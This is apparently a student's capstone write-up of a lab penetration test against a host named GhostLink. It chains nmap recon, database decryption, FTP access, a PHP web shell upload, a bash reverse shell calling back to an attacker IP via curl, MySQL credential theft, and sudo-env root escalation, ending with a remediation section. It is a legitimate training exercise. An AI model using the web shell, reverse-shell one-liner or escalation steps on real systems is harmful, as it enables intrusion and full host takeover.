
This exercise expect us to apply the skills gained to perform a controlled red-team style assessment of the host, chain together discovered vulnerabilities, and achieve root access on the target machine, demonstrating reconnaissance, credential discovery, service pivoting, and privilege escalation.

This is a **learning-focused** capstone: think like an enterprise red team operator, document your steps, justify your choices, and show the evidence that you reached each objective. Your goal is to **obtain a root shell** and collect proof of compromise.


**Deliver within your report:**

1. Output proving you can read `/root/root.txt` (or equivalent root-only artefact).
2. A short attack log (commands / tools used, in chronological order) that demonstrates your chain of compromise.
3. A remediation section listing at least **three** concrete fixes for the issues you exploited.

### GhostLink Scan Report 


![[Ghostlink HTTP.png]]
***Attack Log(Commands used for service exploitation)***

1) -sn : 
2) --min-rate: 
3) -PS:
4) nmap: open source tool (network mapper) for scanning network services and security auditing.
5) -vv: verbose report for as many details as possible 
6) -p- : nmap scan without port specification
7) -sC: default nmap script scan 
8) -sV : nmap service version scan
9) -p : defining the port to be scanned using nmap 


***Active Services Identified***

a) ftp
b) ssh 
c) http

***SSH***

details: 
port state = open
port numbber = 22/tcp
port version= 64 openSSH 9.6p1 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)

ssh-hostkey: 
|   256 ca:03:e6:d9:ae:56:ac:e6:d5:34:64:38:bf:e0:53:65 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLVy/nYJ4pwmM+j/bX6KiXM443Ihf4hQpCSE813o5K2Gic0rgbOoTgrZH5ZSq7NC+my4NThhz2wacpbozyoszGI=
|   256 25:af:3e:24:4a:0e:e9:1b:57:32:64:61:b5:33:bd:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHyn0twjc550XvJ2FW+7fDcq+JltjBY/gY9QY1OLU6Fy

***FTP***
details:
port state = open
port number = 21/tcp
port version = 64 vsftpd 3.0.5
details: 

***HTTP***
details: 
port state = open
port number = 80/tcp
port version = 64 Apache/2.4.58 (Ubuntu)
http-title: `GhostLink :: Portal` or `http://192.168.1.81/`



**Recon**

Legacy synchronization Default credentials SecureGhostLink123 is still in effect
![[dir fuzz.png]]
performed a dir fuzz suing ghostbuster to find interesting links:
`http://192.168.1.81/secure/`
`http://192.168.1.81/secure/users.db.enc` : the database that likely contains user info that can be used to exploit the other services.
`http://192.168.1.81/uploads/`
`http://192.168.1.81/uploads/dev/`
`http://192.168.1.81/uploads/dev/security.txt` contains a note that says the following:
`####Security Reminders For IT DEPT`
1. Reminder to Change the password storage algorithm, base64 is definitely not a good idea.
2. Create Secure Sync between Web & FTP

**OTHER INFORMATION on  landing page:**

- Legacy synchronisation Default credentials `SecureGhostLink123` is still in effect
- Note: All sensitive data is stored securely in an encrypted isolated backup for system restoration purposes by Internal IT with `AES256`.

![[encoded userdb.png]]
`file users.db.enc`  returns:         
`'users.db.enc: openssl enc'd data with salted password, base64 encoded'`


`hexdump -C users.db.enc | head`   : used examining the db.cenc file header in hex/ascii form 


`echo "U2FsdGVkX1/WvhaA" | base64 -d` returns         
`Salted__־�` which confirms that the database file is base64 encoded with a salted password.


**Decrypting the database**

`openssl enc -d -aes-256-cbc -salt -pbkdf2 -in users.db.encrypted -out users.db -k "SecureGhostLink123"` 


returns a list of users to `users.db`, and their `base64 encoded` passwords. These users will probably have different privilege levels depending on their position within the organisation.

`openssl` - command line cryptography toolkit
`enc` - openssl sub-command 
`-aes-256-cbc` - AES with a 256-bit key
`-salt`
`-pbkdf2` -Password-Based Key Derivation Function 2 to derive  encryption key
`-out` - followed by a filename; tells OpenSSL where to write the output
`-k` - Followed by the password string to use for key derivation.

the names, passwords and positions within the organisation;
I used the `echo 'password' | base64 -d` command to decode the passwords one by one since the `security.txt` file said they were encoded in base 64. and the `file users.db.enc` command confirmed it.

| Username      | Role              | Base64 Encoded Password    | decoded Passwords |
| ------------- | ----------------- | -------------------------- | ----------------- |
| **adeboye**   | Security Analyst  | `TmlnaHRIYXdrXzcy`         | NightHawk_72      |
| **a.jensen**  | Cloud Architect   | `V2FycERyaXZlJTMyMQ==`     | WarpDrive%321     |
| **r.faraday** | SysOps Lead       | `VjBsdE5ldCE5MDI=`         | V0ltNet!902       |
| **e.morris**  | DevOps Engineer   | `T3Jpb25TZWN1cmU3Iw==`     | OrionSecure7#     |
| **c.hopkins** | Network Engineer  | `Q2xvdWQhUmVkODg=`         | Cloud!Red88       |
| **dev**       | FTP Administrator | `R2hvc3RTeW5jQEZUUCUxMjM=` | GhostSync@FTP%123 |
The `dev` user is the most promising target for initial access as it's specifically the FTP Administrator.

- Successfully gained FTP access:
![[ftp success.png]]

 - Web shell and Initial foothold: I realised the ftp gave me access to upload/put files so I created a php web shell and put it in the list of folders using FTP
 ![[Insert_shell_v_ftp.png]]
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
ftp 192.168.1.81
put shell.php
```

- I used the `shell.php` file to implement a reverse shell 
```
# Start listener
nc -nvlp 4444

# Trigger reverse shell
curl "http://192.168.1.81/uploads/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.145%2F4444%200%3E%261%27"
```
- Shell stabilization processs was missed here:
- Privilege escalation pathway :
since the other credentials in the first database did not work for ssh and ftp I tried to find another service that encapsulated the phrase - "Create Secure Sync between Web & FTP" from the `security.txt` file.
I searched services that may not be obvious i.e., are not listening for external connections
I found a MySQL tcp service (`port:3306`)listening for local connections only (`127.0.0.1`) 
the service was running on **localhost:3306**, even though it wasn't visible in external nmap scans. found using the `ss -tulpn` command to check for listening sockets and the open processes/services that own them.

 `ss`  Socket statistics — a modern replacement for `netstat`. It queries kernel socket info and prints socket lists

 `-t`  Show **TCP** sockets.

 `-u`  Show **UDP** sockets.

 `-l`  Show only **listening** sockets (servers waiting for connections). For TCP that means sockets in `LISTEN` state.

`-p`  Show the **process** using the socket (program name and PID). Requires root (or CAP_NET_ADMIN) to see other users’ process names; otherwise you’ll see `-` or limited info.

`-n`  Don’t resolve addresses or ports to names (no DNS lookups / no service names). Shows numeric IPs and port numbers (faster and unambiguous)


- I tried to access mysql using the ftp credentials
```
# MySQL access with FTP credentials
mysql -u dev -pGhostSync@FTP%123
```
to get 
![[initial mysqlaccess.png]]

- I decided to look at the creds table in more depth 
![[creds.png]]
sure enough I found some passwords and used them to gain access to ssh
![[ssh login.png]]
- found the first flag in user.txt 
```
ghost@ghostlink:-$ cat user.txt
HACKTALES{priv_escalat10n_m4st3r}
```
 and `sudo -l` to check user privileges which returns
 ```
 User ghost may run the following commands on ghostlink:
(ALL) NOPASSWD: /usr/bin/env
 ```
since the `ghost` user as access to root privileges, it is possible to spawn a shell with root privileges. 
![[final frontier.png]]
 using the `sudo env /bin/bash` command we  spawn a  `bash` shell with root privileges and are able to gain access to `root` without a password from `ghost`. Here, we found the `root/root.txt` file in the `root` directory.
```
||root@ghostlink:/home/ghost# cat /root/root.txt||
HACKTALES{f1rst_blo0d_ftp2web_pwn}
```


- Attack chain: 
```
General service scan & Web Enumeration/fuzzing → Database Decryption → FTP Access → Web Shell → Database Access → SSH Credentials → Sudo Privilege Escalation → Root Access
```



- ##### Remediation section
1. **Broken Auth/Access control**
The login page stated that sensitive data was stored using the `AES256` encryption algorithm and after finding other links, these links could be accessed with little to no form of access control. That is how the `http://192.168.1.81/uploads/dev/security.txt` file was found with sensitive information that led us to the encrypted database and revealed the `base64` hashing algorithm of the passwords stored in the database. As well, the user `ghost` had no password access allowing unrestricted vertical privilege escalation to `root`.

So in essence, principle of least privilege should be implemented to control access to the http links. Access to root privileges (`sudo`) should be passworded. 

2. **Cryptographic Failures ?**
The use of `AES256` encryption algorithm is not bad per se but it should not be made extremely obvious and its encryption key `SecureGhostLink123` as was done on the landing page. the `base64` hashing for the passwords in the encrypted database should be changed for something stronger like `bycrypt`.

3. **Credential Reuse and Exposure**
The `FTP` & `Mysql` services were easily accessed by using the same credentials for the `dev` user. Additionally, the Passwords in the `Mysql` database table which gave access to the `ssh` service from which the root privilege was gotten were stored in plain text. Credentials should not be reused across services and multi-factor authentication should be implemented for `ssh`.  and `FTP` file transfer access should be restricted to files that are sure to not be harmful i.e., images or documents with certain file extensions. Additionally, `FTP` could be configured to allow file transfers from only recognised IP addresses.
